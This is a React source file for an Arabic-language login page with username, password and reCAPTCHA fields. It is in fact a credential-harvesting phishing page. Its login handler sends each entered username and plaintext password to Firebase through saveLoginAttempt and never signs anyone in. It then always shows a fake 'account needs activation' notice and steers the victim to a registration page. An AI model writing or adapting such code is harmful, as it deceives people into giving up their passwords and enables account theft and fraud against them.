import React, { useState, useRef } from "react";
import { Link, useLocation } from "wouter";
import { Header } from "@/components/Header";
import { Footer } from "@/components/Footer";
import { User, Lock, ArrowLeft, MessageCircle, AlertCircle } from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { saveLoginAttempt } from "@/lib/firebase";
import ReCAPTCHA from "react-google-recaptcha";

const RECAPTCHA_SITE_KEY = import.meta.env.VITE_RECAPTCHA_SITE_KEY || "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";

export default function Login() {
  const [, setLocation] = useLocation();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [captchaToken, setCaptchaToken] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showActivationMessage, setShowActivationMessage] = useState(false);
  const recaptchaRef = useRef<ReCAPTCHA>(null);

  const handleCaptchaChange = (token: string | null) => {
    setCaptchaToken(token);
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      toast.error("يرجى إدخال اسم المستخدم وكلمة المرور");
      return;
    }

    if (!captchaToken) {
      toast.error("يرجى التحقق من أنك لست روبوت");
      return;
    }

    setIsLoading(true);

    await saveLoginAttempt(username, password);

    setTimeout(() => {
      setIsLoading(false);
      setShowActivationMessage(true);
      toast.warning("الحساب يحتاج إلى تفعيل");
      recaptchaRef.current?.reset();
      setCaptchaToken(null);
    }, 1000);
  };

  const goToRegister = () => {
    setLocation("/register");
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
      <Header />
      
      <main className="flex-1 container mx-auto px-4 py-8 flex justify-center items-center">
        <div className="w-full max-w-md">
          <div className="bg-gray-100/50 p-6 rounded-lg shadow-sm border border-gray-200">
            <h1 className="text-xl md:text-2xl font-bold text-center text-gray-900 mb-8 pb-4 border-b border-gray-300">
              المصادقة مع اسم المستخدم وكلمة المرور
            </h1>

            {showActivationMessage ? (
              <div className="space-y-6">
                <div className="bg-yellow-50 border border-yellow-300 rounded-lg p-6 text-center">
                  <AlertCircle className="h-12 w-12 text-yellow-500 mx-auto mb-4" />
                  <h2 className="text-lg font-bold text-yellow-800 mb-2">
                    الحساب يحتاج إلى تفعيل
                  </h2>
                  <p className="text-yellow-700 mb-4">
                    لم يتم تفعيل حسابك بعد. يرجى إكمال عملية التسجيل لتفعيل الحساب.
                  </p>
                  <Button 
                    onClick={goToRegister}
                    className="w-full bg-[#1e60a6] hover:bg-[#164e8a] text-white h-12 text-lg"
                    data-testid="button-go-register"
                  >
                    إكمال التسجيل
                  </Button>
                  <Button 
                    variant="outline"
                    onClick={() => setShowActivationMessage(false)}
                    className="w-full mt-3 bg-gray-100 border-gray-300 hover:bg-gray-200 text-gray-700 h-12"
                    data-testid="button-back-login"
                  >
                    العودة لتسجيل الدخول
                  </Button>
                </div>
              </div>
            ) : (
              <>
                <div className="flex items-center gap-3 mb-6">
                  <User className="h-6 w-6 text-gray-600" />
                  <h2 className="text-lg font-bold text-gray-800">الدخول بواسطة اسم المستخدم</h2>
                </div>

                <form onSubmit={handleLogin} className="space-y-6">
                  <div className="space-y-2">
                    <div className="flex items-center gap-4">
                      <label className="w-24 text-right font-bold text-gray-700">اسم المستخدم</label>
                      <Input 
                        className="flex-1 bg-white h-12 text-right" 
                        placeholder="إسم المستخدم"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        data-testid="input-username"
                      />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <div className="flex items-center gap-4">
                      <label className="w-24 text-right font-bold text-gray-700">كلمة المرور</label>
                      <Input 
                        type="password"
                        className="flex-1 bg-white h-12 text-right" 
                        placeholder="كلمة المرور"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        data-testid="input-password"
                      />
                    </div>
                  </div>

                  <div className="flex justify-center mt-6">
                    <ReCAPTCHA
                      ref={recaptchaRef}
                      sitekey={RECAPTCHA_SITE_KEY}
                      onChange={handleCaptchaChange}
                      hl="ar"
                    />
                  </div>

                  <div className="flex gap-4 pt-4">
                    <Button 
                      type="submit"
                      disabled={isLoading}
                      className="flex-1 bg-[#1e60a6] hover:bg-[#164e8a] text-white h-12 text-lg"
                      data-testid="button-login"
                    >
                      {isLoading ? "جاري التحقق..." : "استمر"}
                    </Button>
                    <Link href="/">
                      <Button variant="outline" className="flex-1 bg-gray-100 border-gray-300 hover:bg-gray-200 text-gray-700 h-12 text-lg">
                        رجوع
                      </Button>
                    </Link>
                  </div>
                </form>

                <div className="mt-8 text-center">
                  <Link href="/register">
                    <a className="text-[#1e60a6] hover:underline font-bold text-lg">
                      تسجيل مستخدم جديد
                    </a>
                  </Link>
                </div>
              </>
            )}
          </div>
        </div>
      </main>

      <div className="fixed bottom-6 right-6">
         <button className="bg-white p-3 rounded-full shadow-lg border border-gray-200 hover:bg-gray-50 text-primary">
            <MessageCircle className="h-8 w-8 fill-primary text-white" />
         </button>
      </div>

      <Footer />
    </div>
  );
}
